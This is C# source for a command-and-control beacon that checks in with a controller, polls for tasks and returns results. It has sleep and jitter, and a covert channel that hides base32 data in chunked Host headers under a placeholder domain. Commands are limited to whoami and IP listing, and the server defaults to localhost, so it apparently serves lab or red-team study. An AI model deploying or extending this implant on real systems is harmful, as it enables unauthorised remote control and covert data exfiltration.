using System.Diagnostics;
using System.Globalization;
using System.Net;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using System.Text.Json.Serialization;

sealed class Rule
{
    [JsonPropertyName("method")] public string Method { get; set; } = "";
    [JsonPropertyName("transport")] public string Transport { get; set; } = "";
    [JsonPropertyName("field")] public string Field { get; set; } = "";
}

sealed class Config
{
    [JsonPropertyName("payload_uuid")] public string PayloadUuid { get; set; } = "";
    [JsonPropertyName("profile")] public Dictionary<string, Rule> Profile { get; set; } = new();
    [JsonPropertyName("server_url")] public string ServerUrl { get; set; } = "";
}

sealed class StatusException(int code, string body) : Exception($"HTTP {code}: {body}")
{
    public int Code { get; } = code;
}

sealed class Client
{
    private readonly HttpClient http = new() { Timeout = TimeSpan.FromSeconds(5) };
    private readonly string server = Environment.GetEnvironmentVariable("BOT_SERVER") ?? "http://127.0.0.1:5000";
    private readonly string profile = Environment.GetEnvironmentVariable("BOT_PROFILE") ?? "standard";
    private readonly string path;
    private readonly double sleep;
    private readonly double jitter;

    public Client()
    {
        path = Environment.GetEnvironmentVariable("BOT_CONFIG") ?? $"payload-{profile}.json";
        sleep = double.Parse(Environment.GetEnvironmentVariable("BOT_SLEEP") ?? "5", CultureInfo.InvariantCulture);
        jitter = Math.Clamp(double.Parse(Environment.GetEnvironmentVariable("BOT_JITTER") ?? "0.3", CultureInfo.InvariantCulture), 0, 1);
        if (profile is not ("standard" or "mixed" or "host") || sleep <= 0 || double.IsNaN(sleep)) throw new ArgumentException("Invalid BOT_PROFILE or BOT_SLEEP");
    }

    private async Task<JsonNode> Send(string method, string endpoint, string transport, string field, object value, string payload = "", string host = "")
    {
        string address = server.TrimEnd('/') + "/" + endpoint;
        string? form = null;
        if (transport is "query" or "form")
        {
            string text = value is string s ? s : JsonSerializer.Serialize(value);
            form = Uri.EscapeDataString(field) + "=" + Uri.EscapeDataString(text);
            if (transport == "query") address += "?" + form;
        }
        using var request = new HttpRequestMessage(new HttpMethod(method), address);
        if (payload.Length > 0) request.Headers.TryAddWithoutValidation("X-Payload-UUID", payload);
        if (transport == "host") request.Headers.Host = host;
        else if (transport == "json") request.Content = new StringContent(JsonSerializer.Serialize(new Dictionary<string, object> { [field] = value }), Encoding.UTF8, "application/json");
        else if (transport == "form") request.Content = new StringContent(form!, Encoding.UTF8, "application/x-www-form-urlencoded");
        else if (transport != "query") throw new ArgumentException("Unknown transport");
        using var response = await http.SendAsync(request);
        string body = await response.Content.ReadAsStringAsync();
        if (!response.IsSuccessStatusCode) throw new StatusException((int)response.StatusCode, body);
        return JsonNode.Parse(body) ?? throw new FormatException("Empty JSON response");
    }

    private static string Base32(string text)
    {
        const string alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        var output = new StringBuilder(); int buffer = 0, bits = 0;
        foreach (byte b in Encoding.UTF8.GetBytes(text))
        {
            buffer = (buffer << 8) | b; bits += 8;
            while (bits >= 5) { bits -= 5; output.Append(alphabet[(buffer >> bits) & 31]); buffer &= (1 << bits) - 1; }
        }
        if (bits > 0) output.Append(alphabet[(buffer << (5 - bits)) & 31]);
        return output.ToString();
    }

    private async Task<JsonNode> ProfileRequest(string endpoint, string operation, object value, Config config)
    {
        Rule rule = config.Profile[operation];
        if (rule.Transport != "host") return await Send(rule.Method, endpoint, rule.Transport, rule.Field, value, config.PayloadUuid);
        string text = value is string s ? s : JsonSerializer.Serialize(value);
        if (Encoding.UTF8.GetByteCount(text) is < 1 or > 20000) throw new ArgumentException("Host data must be 1..20000 UTF-8 bytes");
        string encoded = Base32(text), id = Convert.ToHexString(RandomNumberGenerator.GetBytes(6)).ToLowerInvariant();
        int count = (encoded.Length + 49) / 50;
        JsonNode? result = null;
        for (int i = 0; i < count; i++)
        {
            string chunk = encoded.Substring(i * 50, Math.Min(50, encoded.Length - i * 50));
            string host = $"m.{id}.{i + 1}.{count}.{chunk}.demo.test";
            result = await Send(rule.Method, endpoint, "host", rule.Field, value, config.PayloadUuid, host);
            if (i < count - 1 && result["received"] is null) throw new FormatException("Server rejected Host part");
        }
        return result!;
    }

    private async Task<Config> LoadConfig()
    {
        Config config;
        if (File.Exists(path))
        {
            config = JsonSerializer.Deserialize<Config>(await File.ReadAllTextAsync(path, Encoding.UTF8)) ?? throw new FormatException("Invalid config");
            if (config.ServerUrl != server) throw new ArgumentException("BOT_SERVER does not match saved config");
        }
        else
        {
            JsonNode reply = await Send("POST", "payloads", "json", "profile", profile);
            config = reply.Deserialize<Config>() ?? throw new FormatException("Invalid payload response");
            config.ServerUrl = server;
            Directory.CreateDirectory(Path.GetDirectoryName(Path.GetFullPath(path))!);
            await File.WriteAllTextAsync(path, JsonSerializer.Serialize(config, new JsonSerializerOptions { WriteIndented = true }), new UTF8Encoding(false));
        }
        if (!Guid.TryParse(config.PayloadUuid, out _)) throw new FormatException("Invalid payload UUID");
        foreach (string operation in new[] { "checkin", "get_task", "post_task" })
        {
            if (!config.Profile.TryGetValue(operation, out Rule? rule) || rule.Method is not ("GET" or "POST") || rule.Transport is not ("json" or "form" or "query" or "host") || string.IsNullOrWhiteSpace(rule.Field) || rule.Field.Length > 64 || (rule.Method == "GET" && rule.Transport is not ("query" or "host")))
                throw new FormatException($"Invalid profile rule {operation}");
        }
        return config;
    }

    private static string Execute(string command)
    {
        switch (command)
        {
            case "whoami":
                using (var process = Process.Start(new ProcessStartInfo(Path.Combine(Environment.GetEnvironmentVariable("SystemRoot") ?? "C:\\Windows", "System32", "whoami.exe")) { UseShellExecute = false, RedirectStandardOutput = true, CreateNoWindow = true })!)
                {
                    string output = process.StandardOutput.ReadToEnd();
                    if (!process.WaitForExit(5000)) { process.Kill(); throw new TimeoutException("whoami timeout"); }
                    if (process.ExitCode != 0) throw new InvalidOperationException("whoami failed");
                    return output.Trim();
                }
            case "ip":
                var lines = new List<string>();
                foreach (var nic in NetworkInterface.GetAllNetworkInterfaces())
                    foreach (var address in nic.GetIPProperties().UnicastAddresses)
                        if (address.Address.AddressFamily is System.Net.Sockets.AddressFamily.InterNetwork or System.Net.Sockets.AddressFamily.InterNetworkV6)
                            lines.Add($"{nic.Name}: {address.Address}");
                return lines.Count == 0 ? "IP адресов не нашёл" : string.Join("\n", lines);
            case "exit": return "Выхожу";
            default: throw new ArgumentException("Unknown command");
        }
    }

    public async Task Run()
    {
        Config config = await LoadConfig();
        Console.WriteLine($"Config: {path} Payload: {config.PayloadUuid}");
        string callback = (await ProfileRequest("checkin", "checkin", config.PayloadUuid, config))["callback_uuid"]?.GetValue<string>() ?? throw new FormatException("Missing callback UUID");
        if (!Guid.TryParse(callback, out _)) throw new FormatException("Invalid callback UUID");
        Console.WriteLine($"Callback: {callback}");
        (int ID, string Command, string Result)? pending = null;
        while (true)
        {
            try
            {
                if (pending is null)
                {
                    JsonNode? task = (await ProfileRequest("poll", "get_task", callback, config))["task"];
                    if (task is not null)
                    {
                        int id = task["task_id"]?.GetValue<int>() ?? throw new FormatException("Missing task ID");
                        string command = task["command"]?.GetValue<string>() ?? throw new FormatException("Missing command");
                        string result;
                        try { result = Execute(command); } catch (Exception error) { result = "Ошибка: " + error.Message; }
                        if (result.Length > 20000) result = result[..20000];
                        pending = (id, command, result);
                        Console.WriteLine($"Task: {id} {command}");
                    }
                }
                if (pending is not null)
                {
                    var current = pending.Value;
                    await ProfileRequest("results", "post_task", new { callback_uuid = callback, task_id = current.ID, result = current.Result }, config);
                    Console.WriteLine($"Result sent: {current.ID}");
                    if (current.Command == "exit") return;
                    pending = null;
                }
            }
            catch (StatusException error) when (error.Code >= 400 && error.Code < 500) { throw; }
            catch (Exception error) { Console.WriteLine("Connection failed, retrying: " + error.Message); }
            double delay = Math.Max(0.1, sleep * (1 + (Random.Shared.NextDouble() * 2 - 1) * jitter));
            await Task.Delay(TimeSpan.FromSeconds(delay));
        }
    }
}

static class Program
{
    static async Task Main()
    {
        try { await new Client().Run(); }
        catch (Exception error) { Console.Error.WriteLine(error.Message); Environment.ExitCode = 1; }
    }
}
